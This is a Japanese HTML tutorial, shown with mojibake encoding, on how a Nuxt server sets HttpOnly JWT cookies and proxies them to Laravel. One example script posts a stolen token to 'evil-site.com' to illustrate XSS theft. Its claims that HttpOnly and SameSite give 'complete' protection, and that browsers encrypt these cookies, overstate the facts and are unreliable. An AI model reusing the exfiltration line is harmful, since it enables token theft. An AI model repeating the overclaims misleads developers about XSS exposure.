<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ğŸª HttpOnly Cookieå®Œå…¨è§£èª¬ï¼šèª°ãŒè¨­å®šã—ã€èª°ãŒä¿æœ‰ã—ã€èª°ãŒã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã®ã‹ï¼Ÿ</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #8B5CF6 0%, #A855F7 100%);
            min-height: 100vh;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        h1 {
            color: #2c3e50;
            text-align: center;
            border-bottom: 4px solid #8B5CF6;
            padding-bottom: 15px;
            margin-bottom: 30px;
            font-size: 2.2em;
        }
        h2 {
            color: #34495e;
            border-left: 5px solid #8B5CF6;
            padding-left: 20px;
            margin-top: 40px;
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            padding: 15px 20px;
            border-radius: 10px;
        }
        .question-answer {
            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
            color: white;
            padding: 25px;
            border-radius: 15px;
            margin: 25px 0;
            text-align: center;
        }
        .question-answer h3 {
            margin-top: 0;
            font-size: 1.3em;
        }
        .answer {
            font-size: 1.1em;
            font-weight: bold;
            margin-top: 15px;
        }
        .cookie-roles {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 25px;
            margin: 30px 0;
        }
        .role-card {
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
            transition: transform 0.3s ease;
        }
        .role-card:hover {
            transform: translateY(-5px);
        }
        .setter {
            background: linear-gradient(135deg, #8B5CF6 0%, #A855F7 100%);
            color: white;
        }
        .holder {
            background: linear-gradient(135deg, #3B82F6 0%, #2563EB 100%);
            color: white;
        }
        .accessor {
            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
            color: white;
        }
        .blocker {
            background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
            color: white;
        }
        .role-card h3 {
            margin-top: 0;
            font-size: 1.4em;
            text-align: center;
            border-bottom: 2px solid rgba(255,255,255,0.3);
            padding-bottom: 10px;
        }
        .flow-diagram {
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            padding: 30px;
            border-radius: 15px;
            margin: 25px 0;
            overflow-x: auto;
            border: 2px solid #8B5CF6;
        }
        .flow-step {
            background: white;
            padding: 20px;
            margin: 15px 0;
            border-radius: 10px;
            position: relative;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            border-left: 5px solid #8B5CF6;
        }
        .flow-step::before {
            content: attr(data-step);
            position: absolute;
            left: -20px;
            top: 20px;
            background: #8B5CF6;
            color: white;
            padding: 8px 12px;
            border-radius: 50%;
            font-weight: bold;
            font-size: 14px;
        }
        .code-block {
            background: #2d3748;
            color: #e2e8f0;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Monaco', 'Courier New', monospace;
            font-size: 14px;
            overflow-x: auto;
            margin: 15px 0;
            line-height: 1.4;
            border: 2px solid #4a5568;
        }
        .code-block.success {
            border: 2px solid #10B981;
        }
        .code-block.error {
            border: 2px solid #EF4444;
        }
        .security-comparison {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 25px;
            margin: 25px 0;
        }
        .security-card {
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
        }
        .vulnerable {
            background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
            color: white;
        }
        .secure {
            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
            color: white;
        }
        .mechanism-details {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 15px;
            border: 2px solid #8B5CF6;
            margin: 25px 0;
        }
        .access-matrix {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        .access-matrix th {
            background: #8B5CF6;
            color: white;
            padding: 15px;
            text-align: center;
        }
        .access-matrix td {
            padding: 15px;
            text-align: center;
            border-bottom: 1px solid #e5e7eb;
        }
        .allowed {
            background: #dcfce7;
            color: #166534;
            font-weight: bold;
        }
        .blocked {
            background: #fee2e2;
            color: #991b1b;
            font-weight: bold;
        }
        .system-emoji {
            font-size: 1.8em;
            margin: 0 10px;
        }
        .arrow {
            font-size: 24px;
            color: #8B5CF6;
            margin: 0 10px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.6; }
            100% { opacity: 1; }
        }
        .highlight-box {
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .success-box {
            background: linear-gradient(135deg, #10B981 0%, #059669 100%);
            color: white;
            padding: 25px;
            border-radius: 15px;
            margin: 25px 0;
        }
        @media (max-width: 768px) {
            .cookie-roles,
            .security-comparison {
                grid-template-columns: 1fr;
            }
            .container {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸª HttpOnly Cookie ãƒ¡ã‚«ãƒ‹ã‚ºãƒ å®Œå…¨è§£èª¬<br>è¨­å®šè€…ãƒ»ä¿æœ‰è€…ãƒ»ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã®å…¨ã¦</h1>

        <div class="question-answer">
            <h3>ğŸ¤” é‡è¦ãªè³ªå•ã¸ã®æ˜ç¢ºãªå›ç­”</h3>
            <p><strong>Q1: JWTãƒˆãƒ¼ã‚¯ãƒ³ã‚’HttpOnly Cookieã§ä¿æœ‰ã—ã¦ã„ã‚‹ã®ã¯èª°ï¼Ÿ</strong></p>
            <div class="answer">A1: ğŸŒ ãƒ–ãƒ©ã‚¦ã‚¶ãŒ HttpOnly Cookie ã‚’ä¿æœ‰ã—ã¦ã„ã¾ã™</div>
            
            <p><strong>Q2: HttpOnly Cookieã‚’ãƒ–ãƒ©ã‚¦ã‚¶ã«åŸ‹ã‚è¾¼ã‚€ã®ã¯èª°ï¼Ÿ</strong></p>
            <div class="answer">A2: ğŸš€ Nuxt ã‚µãƒ¼ãƒãƒ¼ãŒ setCookie() ã§åŸ‹ã‚è¾¼ã¿ã¾ã™</div>
        </div>

        <h2>ğŸ‘¥ HttpOnly Cookie ã®4ã¤ã®é–¢ä¿‚è€…</h2>
        <div class="cookie-roles">
            <div class="role-card setter">
                <h3>ğŸš€ Nuxt ã‚µãƒ¼ãƒãƒ¼ï¼ˆè¨­å®šè€…ï¼‰</h3>
                <ul>
                    <li><strong>å½¹å‰²</strong>: HttpOnly Cookieã®è¨­å®šãƒ»å‰Šé™¤</li>
                    <li><strong>æ¨©é™</strong>: å®Œå…¨ãªCookieåˆ¶å¾¡æ¨©</li>
                    <li><strong>æ©Ÿèƒ½</strong>:</li>
                    <li>â€¢ setCookie() ã§Cookieè¨­å®š</li>
                    <li>â€¢ getCookie() ã§Cookieèª­ã¿å–ã‚Š</li>
                    <li>â€¢ Cookieå‰Šé™¤ï¼ˆãƒ­ã‚°ã‚¢ã‚¦ãƒˆæ™‚ï¼‰</li>
                    <li>â€¢ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å±æ€§ã®ç®¡ç†</li>
                </ul>
                <div class="code-block">
// Cookieè¨­å®šï¼ˆãƒ­ã‚°ã‚¤ãƒ³æ™‚ï¼‰
setCookie(event, 'auth_jwt', idToken, {
  httpOnly: true,    // JS ã‚¢ã‚¯ã‚»ã‚¹ä¸å¯
  secure: true,      // HTTPS å¿…é ˆ
  sameSite: 'lax',   // CSRF å¯¾ç­–
  maxAge: 3600       // 1æ™‚é–“æœ‰åŠ¹
})
                </div>
            </div>

            <div class="role-card holder">
                <h3>ğŸŒ ãƒ–ãƒ©ã‚¦ã‚¶ï¼ˆä¿æœ‰è€…ï¼‰</h3>
                <ul>
                    <li><strong>å½¹å‰²</strong>: HttpOnly Cookieã®å®‰å…¨ãªä¿ç®¡</li>
                    <li><strong>æ¨©é™</strong>: è‡ªå‹•Cookieç®¡ç†</li>
                    <li><strong>æ©Ÿèƒ½</strong>:</li>
                    <li>â€¢ HttpOnly Cookieã®æš—å·åŒ–ä¿å­˜</li>
                    <li>â€¢ HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆæ™‚ã®è‡ªå‹•é€ä¿¡</li>
                    <li>â€¢ JavaScript ã‹ã‚‰ã®ã‚¢ã‚¯ã‚»ã‚¹å®Œå…¨é®æ–­</li>
                    <li>â€¢ æœ‰åŠ¹æœŸé™ã®è‡ªå‹•ç®¡ç†</li>
                </ul>
                <div class="code-block success">
// ãƒ–ãƒ©ã‚¦ã‚¶ã®è‡ªå‹•å‹•ä½œ
fetch('/api/posts', {
  method: 'POST',
  body: JSON.stringify({...})
})
// â†‘ auth_jwt Cookie ãŒè‡ªå‹•ã§é€ä¿¡ã•ã‚Œã‚‹
// JavaScript ã‹ã‚‰ã¯è¦‹ãˆãªã„ãŒæ­£å¸¸å‹•ä½œ
                </div>
            </div>

            <div class="role-card accessor">
                <h3>âœ… è¨±å¯ã•ã‚ŒãŸã‚¢ã‚¯ã‚»ã‚¹è€…</h3>
                <ul>
                    <li><strong>ğŸš€ Nuxt ã‚µãƒ¼ãƒãƒ¼</strong></li>
                    <li>â€¢ getCookie() ã§JWTå–å¾—</li>
                    <li>â€¢ Laravel APIã¸ã®ãƒ—ãƒ­ã‚­ã‚·æ™‚ã«ä½¿ç”¨</li>
                    <li><strong>ğŸŒ ãƒ–ãƒ©ã‚¦ã‚¶ï¼ˆå†…éƒ¨å‡¦ç†ï¼‰</strong></li>
                    <li>â€¢ HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆæ™‚ã®è‡ªå‹•ä»˜ä¸</li>
                    <li>â€¢ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã«å¾“ã£ãŸç®¡ç†</li>
                </ul>
                <div class="code-block success">
// Nuxt ã‚µãƒ¼ãƒãƒ¼ã§ã®æ­£å½“ãªã‚¢ã‚¯ã‚»ã‚¹
export default defineEventHandler(async (event) => {
  const authJwt = getCookie(event, 'auth_jwt')
  if (authJwt) {
    // Laravel API ã«ãƒ—ãƒ­ã‚­ã‚·
    return await proxyToLaravel(authJwt)
  }
})
                </div>
            </div>

            <div class="role-card blocker">
                <h3>âŒ ã‚¢ã‚¯ã‚»ã‚¹æ‹’å¦ã•ã‚Œã‚‹è€…</h3>
                <ul>
                    <li><strong>ğŸŒ JavaScriptï¼ˆã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ï¼‰</strong></li>
                    <li>â€¢ document.cookie ã§è¦‹ãˆãªã„</li>
                    <li>â€¢ localStorage ã«ã‚‚ä¿å­˜ã•ã‚Œãªã„</li>
                    <li>â€¢ XSSæ”»æ’ƒã‹ã‚‰ã®å®Œå…¨ä¿è­·</li>
                    <li><strong>ğŸŒ å¤–éƒ¨ã‚µã‚¤ãƒˆ</strong></li>
                    <li>â€¢ SameSiteå±æ€§ã«ã‚ˆã‚Šé®æ–­</li>
                    <li>â€¢ CSRFæ”»æ’ƒã®é˜²æ­¢</li>
                </ul>
                <div class="code-block error">
// ã“ã‚Œã‚‰ã¯å…¨ã¦å¤±æ•—ã™ã‚‹ï¼ˆHttpOnlyä¿è­·ï¼‰
console.log(document.cookie)
// â†’ auth_jwt ã¯è¡¨ç¤ºã•ã‚Œãªã„

localStorage.getItem('auth_jwt')
// â†’ nullï¼ˆä¿å­˜ã•ã‚Œã¦ã„ãªã„ï¼‰

// æ‚ªæ„ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚‚ JWT ã«ã‚¢ã‚¯ã‚»ã‚¹ä¸å¯
// XSSæ”»æ’ƒãŒæˆåŠŸã—ã¦ã‚‚ãƒˆãƒ¼ã‚¯ãƒ³ã¯ç›—ã‚ãªã„
                </div>
            </div>
        </div>

        <h2>ğŸ”„ HttpOnly Cookie ã®å®Œå…¨ãªãƒ©ã‚¤ãƒ•ã‚µã‚¤ã‚¯ãƒ«</h2>

        <h3>1ï¸âƒ£ Cookieè¨­å®šãƒ•ãƒ­ãƒ¼ï¼ˆãƒ­ã‚°ã‚¤ãƒ³æ™‚ï¼‰</h3>
        <div class="flow-diagram">
            <div class="flow-step" data-step="1">
                <strong>ğŸŒ ãƒ–ãƒ©ã‚¦ã‚¶ â†’ ğŸ”¥ Firebase Auth</strong><br>
                ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ â†’ Firebase SDKãŒç›´æ¥èªè¨¼å‡¦ç†
                <div class="code-block">
// ãƒ–ãƒ©ã‚¦ã‚¶å†…JavaScript
const userCredential = await signInWithEmailAndPassword(auth, email, password)
const idToken = await userCredential.user.getIdToken()
// ã“ã®æ™‚ç‚¹ã§ã¯ JWT ã¯ãƒ¡ãƒ¢ãƒªå†…ã®ã¿ï¼ˆCookieæœªè¨­å®šï¼‰
                </div>
            </div>
            <div class="flow-step" data-step="2">
                <strong>ğŸŒ ãƒ–ãƒ©ã‚¦ã‚¶ â†’ ğŸš€ Nuxt API</strong><br>
                å–å¾—ã—ãŸJWTã‚’Nuxt APIï¼ˆ/api/auth/loginï¼‰ã«é€ä¿¡
                <div class="code-block">
// ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰Nuxt APIã¸
const response = await $fetch('/api/auth/login', {
  method: 'POST',
  body: { idToken: idToken }  // JWT ã‚’ã‚µãƒ¼ãƒãƒ¼ã«é€ä¿¡
})
                </div>
            </div>
            <div class="flow-step" data-step="3">
                <strong>ğŸš€ Nuxt ã‚µãƒ¼ãƒãƒ¼ â†’ ğŸ”¥ Firebase Auth</strong><br>
                Nuxt ã‚µãƒ¼ãƒãƒ¼ãŒFirebase Admin SDKã§JWTæ¤œè¨¼
                <div class="code-block">
// Nuxt ã‚µãƒ¼ãƒãƒ¼å†…å‡¦ç†
const decodedToken = await admin.auth().verifyIdToken(idToken)
// JWT ã®ç½²åãƒ»æœ‰åŠ¹æœŸé™ã‚’æ¤œè¨¼
                </div>
            </div>
            <div class="flow-step" data-step="4">
                <strong>ğŸš€ Nuxt ã‚µãƒ¼ãƒãƒ¼ â†’ ğŸŒ ãƒ–ãƒ©ã‚¦ã‚¶</strong><br>
                æ¤œè¨¼æˆåŠŸæ™‚ã€HttpOnly Cookieã‚’è¨­å®šã—ã¦ãƒ¬ã‚¹ãƒãƒ³ã‚¹
                <div class="code-block">
// Nuxt ã‚µãƒ¼ãƒãƒ¼ãŒCookieè¨­å®š
setCookie(event, 'auth_jwt', idToken, {
  httpOnly: true,     // JavaScript ã‚¢ã‚¯ã‚»ã‚¹ä¸å¯ã«è¨­å®š
  secure: true,       // HTTPS ã§ã®ã¿é€ä¿¡
  sameSite: 'lax',    // CSRF æ”»æ’ƒå¯¾ç­–
  maxAge: 3600,       // 1æ™‚é–“æœ‰åŠ¹
  path: '/'           // å…¨ãƒ‘ã‚¹ã§æœ‰åŠ¹
})

// ãƒ–ãƒ©ã‚¦ã‚¶ã¯è‡ªå‹•ã§ã“ã®Cookieã‚’ä¿å­˜ã™ã‚‹
                </div>
            </div>
        </div>

        <h3>2ï¸âƒ£ Cookieåˆ©ç”¨ãƒ•ãƒ­ãƒ¼ï¼ˆAPIå‘¼ã³å‡ºã—æ™‚ï¼‰</h3>
        <div class="flow-diagram">
            <div class="flow-step" data-step="1">
                <strong>ğŸŒ ãƒ–ãƒ©ã‚¦ã‚¶ â†’ ğŸš€ Nuxt API</strong><br>
                æŠ•ç¨¿ä½œæˆãªã©ã®APIå‘¼ã³å‡ºã—ï¼ˆCookieè‡ªå‹•é€ä¿¡ï¼‰
                <div class="code-block">
// ãƒ–ãƒ©ã‚¦ã‚¶ã‹ã‚‰ API å‘¼ã³å‡ºã—
const response = await $fetch('/api/posts', {
  method: 'POST',
  body: { content: 'æŠ•ç¨¿å†…å®¹' }
})

// é‡è¦ï¼šJavaScript ã‹ã‚‰ã¯ auth_jwt Cookie ã¯è¦‹ãˆãªã„
// ã§ã‚‚ãƒ–ãƒ©ã‚¦ã‚¶ãŒè‡ªå‹•ã§ Cookie ã‚’é€ä¿¡ã™ã‚‹
                </div>
            </div>
            <div class="flow-step" data-step="2">
                <strong>ğŸš€ Nuxt ã‚µãƒ¼ãƒãƒ¼</strong><br>
                HttpOnly Cookieã‹ã‚‰JWTã‚’å–å¾—
                <div class="code-block">
// Nuxt ã‚µãƒ¼ãƒãƒ¼ã§ Cookie å–å¾—
const authJwt = getCookie(event, 'auth_jwt')

if (!authJwt) {
  return { success: false, error: 'èªè¨¼ãŒå¿…è¦ã§ã™' }
}
// ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã§ã®ã¿ JWT ã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½
                </div>
            </div>
            <div class="flow-step" data-step="3">
                <strong>ğŸš€ Nuxt ã‚µãƒ¼ãƒãƒ¼ â†’ âš¡ Laravel API</strong><br>
                èªè¨¼æƒ…å ±ã‚’å«ã‚ã¦Laravelã«ãƒ—ãƒ­ã‚­ã‚·
                <div class="code-block">
// Laravel API ã¸ãƒ—ãƒ­ã‚­ã‚·
const response = await $fetch('http://nginx/api/posts', {
  method: 'POST',
  headers: {
    'Cookie': `auth_jwt=${authJwt}`  // JWT ã‚’ Laravel ã«è»¢é€
  },
  body: requestBody
})
                </div>
            </div>
        </div>

        <h2>ğŸ”’ ã‚¢ã‚¯ã‚»ã‚¹æ¨©é™ãƒãƒˆãƒªãƒƒã‚¯ã‚¹</h2>
        <table class="access-matrix">
            <thead>
                <tr>
                    <th>æ“ä½œ / ã‚·ã‚¹ãƒ†ãƒ </th>
                    <th>ğŸŒ ãƒ–ãƒ©ã‚¦ã‚¶ JavaScript</th>
                    <th>ğŸš€ Nuxt ã‚µãƒ¼ãƒãƒ¼</th>
                    <th>ğŸŒ ãƒ–ãƒ©ã‚¦ã‚¶å†…éƒ¨</th>
                    <th>ğŸŒ å¤–éƒ¨ã‚µã‚¤ãƒˆ</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td><strong>Cookieèª­ã¿å–ã‚Š</strong></td>
                    <td class="blocked">âŒ æ‹’å¦</td>
                    <td class="allowed">âœ… è¨±å¯</td>
                    <td class="allowed">âœ… è¨±å¯</td>
                    <td class="blocked">âŒ æ‹’å¦</td>
                </tr>
                <tr>
                    <td><strong>Cookieè¨­å®š</strong></td>
                    <td class="blocked">âŒ æ‹’å¦</td>
                    <td class="allowed">âœ… è¨±å¯</td>
                    <td class="blocked">âŒ æ‹’å¦</td>
                    <td class="blocked">âŒ æ‹’å¦</td>
                </tr>
                <tr>
                    <td><strong>Cookieå‰Šé™¤</strong></td>
                    <td class="blocked">âŒ æ‹’å¦</td>
                    <td class="allowed">âœ… è¨±å¯</td>
                    <td class="blocked">âŒ æ‹’å¦</td>
                    <td class="blocked">âŒ æ‹’å¦</td>
                </tr>
                <tr>
                    <td><strong>HTTPé€ä¿¡</strong></td>
                    <td class="blocked">âŒ æ‹’å¦</td>
                    <td class="allowed">âœ… è¨±å¯</td>
                    <td class="allowed">âœ… è‡ªå‹•</td>
                    <td class="blocked">âŒ æ‹’å¦</td>
                </tr>
            </tbody>
        </table>

        <h2>ğŸ›¡ï¸ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ¯”è¼ƒï¼šå¾“æ¥æ–¹å¼ vs HttpOnly Cookie</h2>
        <div class="security-comparison">
            <div class="security-card vulnerable">
                <h3>âŒ å¾“æ¥æ–¹å¼ï¼ˆJavaScriptã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ï¼‰</h3>
                <h4>è„†å¼±æ€§ï¼š</h4>
                <ul>
                    <li><strong>XSSæ”»æ’ƒã«è„†å¼±</strong></li>
                    <li>æ‚ªæ„ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒ JWT ã‚’ç›—ã‚ã‚‹</li>
                    <li>localStorage/sessionStorage ã‚‚å±é™º</li>
                    <li>document.cookie ã§ç°¡å˜ã«ã‚¢ã‚¯ã‚»ã‚¹</li>
                </ul>
                <div class="code-block error">
// å±é™ºãªå¾“æ¥æ–¹å¼
localStorage.setItem('jwt', token)
// â†‘ XSSæ”»æ’ƒã§ç°¡å˜ã«ç›—ã¾ã‚Œã‚‹

// æ‚ªæ„ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆ
const stolenToken = localStorage.getItem('jwt')
fetch('https://evil-site.com/steal', {
  method: 'POST',
  body: { token: stolenToken }
})
// â†‘ JWT ãŒç›—ã¾ã‚Œã¦ã‚¢ã‚«ã‚¦ãƒ³ãƒˆä¹—ã£å–ã‚Š
                </div>
            </div>

            <div class="security-card secure">
                <h3>âœ… HttpOnly Cookieæ–¹å¼</h3>
                <h4>ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ©Ÿèƒ½ï¼š</h4>
                <ul>
                    <li><strong>XSSæ”»æ’ƒå®Œå…¨é˜²å¾¡</strong></li>
                    <li>JavaScript ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹ä¸å¯</li>
                    <li>CSRFæ”»æ’ƒã‚‚ SameSite ã§é˜²å¾¡</li>
                    <li>HTTPSå¼·åˆ¶ã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¿è­·</li>
                </ul>
                <div class="code-block success">
// ã‚»ã‚­ãƒ¥ã‚¢ãªHttpOnlyæ–¹å¼
// JWT ã¯ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã§ã®ã¿ç®¡ç†

// æ‚ªæ„ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¦ã‚‚...
console.log(document.cookie)
// â†‘ auth_jwt ã¯è¦‹ãˆãªã„ï¼ˆHttpOnlyä¿è­·ï¼‰

localStorage.getItem('jwt')
// â†‘ nullï¼ˆä¿å­˜ã•ã‚Œã¦ã„ãªã„ï¼‰

// æ”»æ’ƒè€…ã¯ JWT ã‚’ç›—ã‚€ã“ã¨ãŒã§ããªã„ï¼
                </div>
            </div>
        </div>

        <h2>ğŸ’» å®Ÿéš›ã®ã‚³ãƒ¼ãƒ‰å‹•ä½œä¾‹</h2>

        <div class="mechanism-details">
            <h3>ğŸ” ãƒ–ãƒ©ã‚¦ã‚¶é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ã§ã®ç¢ºèªæ–¹æ³•</h3>
            
            <h4>1. Application ã‚¿ãƒ– â†’ Cookies</h4>
            <div class="code-block">
Name: auth_jwt
Value: eyJhbGciOiJSUzI1NiIs... (JWT ãƒˆãƒ¼ã‚¯ãƒ³)
Domain: localhost
Path: /
Expires: 2024-XX-XX XX:XX:XX
HttpOnly: âœ… (ãƒã‚§ãƒƒã‚¯ä»˜ã)
Secure: âœ… (HTTPSæ™‚)
SameSite: Lax
            </div>

            <h4>2. Console ã§ã®å‹•ä½œç¢ºèª</h4>
            <div class="code-block error">
// ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§å®Ÿè¡Œã—ã¦ã¿ã‚ˆã†
console.log(document.cookie)
// çµæœ: "other_cookie=value" (auth_jwt ã¯è¡¨ç¤ºã•ã‚Œãªã„)

document.cookie = "auth_jwt=hacked"
// çµæœ: HttpOnly ã«ã‚ˆã‚Šè¨­å®šã§ããªã„

localStorage.getItem('auth_jwt')
// çµæœ: null (ä¿å­˜ã•ã‚Œã¦ã„ãªã„)
            </div>

            <h4>3. Network ã‚¿ãƒ–ã§ã®é€ä¿¡ç¢ºèª</h4>
            <div class="code-block success">
// APIå‘¼ã³å‡ºã—æ™‚ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ãƒ¼
Request Headers:
Cookie: auth_jwt=eyJhbGciOiJSUzI1NiIs...

// JavaScript ã‹ã‚‰ã¯è¦‹ãˆãªã„ãŒã€
// ãƒ–ãƒ©ã‚¦ã‚¶ãŒè‡ªå‹•ã§ Cookie ã‚’é€ä¿¡ã—ã¦ã„ã‚‹
            </div>
        </div>

        <h2>ğŸ”§ æŠ€è¡“çš„ãªä»•çµ„ã¿ã®è©³ç´°</h2>

        <div class="highlight-box">
            <h3>ğŸ¤– ãƒ–ãƒ©ã‚¦ã‚¶ã®å†…éƒ¨å‹•ä½œ</h3>
            <ol>
                <li><strong>Cookieå—ä¿¡æ™‚</strong>: Set-Cookie ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è§£æ</li>
                <li><strong>HttpOnlyç¢ºèª</strong>: JavaScript API ã‹ã‚‰ã®éš è”½ã‚’è¨­å®š</li>
                <li><strong>ã‚»ã‚­ãƒ¥ã‚¢ä¿å­˜</strong>: æš—å·åŒ–ã—ã¦ãƒ‡ã‚£ã‚¹ã‚¯ã«ä¿å­˜</li>
                <li><strong>ãƒªã‚¯ã‚¨ã‚¹ãƒˆæ™‚</strong>: ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ»ãƒ‘ã‚¹ãƒ»æœŸé™ã‚’ãƒã‚§ãƒƒã‚¯</li>
                <li><strong>è‡ªå‹•é€ä¿¡</strong>: æ¡ä»¶ãŒåˆè‡´ã™ã‚Œã° Cookie ãƒ˜ãƒƒãƒ€ãƒ¼ã«è¿½åŠ </li>
            </ol>
        </div>

        <div class="highlight-box">
            <h3>ğŸš€ Nuxt ã‚µãƒ¼ãƒãƒ¼ã®å½¹å‰²</h3>
            <ol>
                <li><strong>èªè¨¼ã‚²ãƒ¼ãƒˆã‚¦ã‚§ã‚¤</strong>: å…¨ã¦ã®èªè¨¼å‡¦ç†ã‚’é›†ç´„</li>
                <li><strong>Cookieç®¡ç†è€…</strong>: è¨­å®šãƒ»èª­ã¿å–ã‚Šãƒ»å‰Šé™¤ã®å®Œå…¨åˆ¶å¾¡</li>
                <li><strong>ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¢ƒç•Œ</strong>: ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ»ã‚µãƒ¼ãƒãƒ¼é–“ã®å®‰å…¨ãªæ©‹æ¸¡ã—</li>
                <li><strong>ãƒ—ãƒ­ã‚­ã‚·æ©Ÿèƒ½</strong>: Laravel API ã¸ã®èªè¨¼æƒ…å ±è»¢é€</li>
            </ol>
        </div>

        <h2>ğŸ¯ ã¾ã¨ã‚ï¼šHttpOnly Cookie ã®å®Œç’§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ¢ãƒ‡ãƒ«</h2>

        <div class="success-box">
            <h3>ğŸ† ç†æƒ³çš„ãªå½¹å‰²åˆ†æ‹…ã®å®Ÿç¾</h3>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
                <div>
                    <h4>ğŸš€ Nuxt ã‚µãƒ¼ãƒãƒ¼ = Cookieç®¡ç†è€…</h4>
                    <ul>
                        <li>setCookie() ã§å®‰å…¨ãªè¨­å®š</li>
                        <li>getCookie() ã§é©åˆ‡ãªèª­ã¿å–ã‚Š</li>
                        <li>ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å±æ€§ã®å®Œå…¨åˆ¶å¾¡</li>
                        <li>ãƒ­ã‚°ã‚¢ã‚¦ãƒˆæ™‚ã®ç¢ºå®Ÿãªå‰Šé™¤</li>
                    </ul>
                </div>
                <div>
                    <h4>ğŸŒ ãƒ–ãƒ©ã‚¦ã‚¶ = Cookieä¿ç®¡åº«</h4>
                    <ul>
                        <li>HttpOnly Cookie ã®æš—å·åŒ–ä¿å­˜</li>
                        <li>è‡ªå‹•çš„ãª HTTP é€ä¿¡</li>
                        <li>JavaScript ã‹ã‚‰ã®å®Œå…¨é®æ–­</li>
                        <li>æœ‰åŠ¹æœŸé™ã®è‡ªå‹•ç®¡ç†</li>
                    </ul>
                </div>
            </div>

            <h4>ğŸ”’ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ä¸‰é‡é˜²å¾¡</h4>
            <ol>
                <li><strong>HttpOnly</strong>: XSSæ”»æ’ƒã‹ã‚‰ã®å®Œå…¨ä¿è­·</li>
                <li><strong>SameSite</strong>: CSRFæ”»æ’ƒã®å®Œå…¨é˜²å¾¡</li>
                <li><strong>Secure</strong>: ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ç›—è´ã‹ã‚‰ã®ä¿è­·</li>
            </ol>

            <div style="text-align: center; margin-top: 25px; font-size: 1.1em;">
                <strong>ğŸ‰ ã“ã‚Œã«ã‚ˆã‚Šã€JWT ãƒˆãƒ¼ã‚¯ãƒ³ã¯æœ€é«˜ãƒ¬ãƒ™ãƒ«ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã§ä¿è­·ã•ã‚Œã¦ã„ã¾ã™ï¼</strong>
            </div>
        </div>

        <div style="text-align: center; margin-top: 50px; padding: 30px; background: linear-gradient(135deg, #8B5CF6 0%, #A855F7 100%); color: white; border-radius: 15px;">
            <h3>ğŸª HttpOnly Cookie ãƒã‚¹ã‚¿ãƒ¼å®Œäº†ï¼</h3>
            <p style="font-size: 1.1em; margin: 15px 0;">
